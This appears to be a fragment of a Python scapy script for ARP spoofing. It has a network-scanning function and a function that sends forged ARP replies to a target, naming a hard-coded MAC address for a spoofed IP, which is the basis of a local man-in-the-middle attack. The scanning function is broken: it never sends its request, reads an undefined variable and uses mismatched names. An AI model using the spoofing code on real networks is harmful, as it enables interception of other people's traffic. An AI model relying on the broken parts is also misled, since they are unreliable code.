import scapy.all as scapy

def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest

    answeredList[0][1].hwsrc
    clientsList = []
    for el in answeredList:
        client_dict = {"ip": el[1].psrc, "mac": el[1].hwsrc}
        clientsList.append(client_disct)
    return client_list

def spoof(targetIp, spoofIp):
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst="00:23:d1:d0:cd:21", psrc=spoofIp)
    scapy.send(packet)

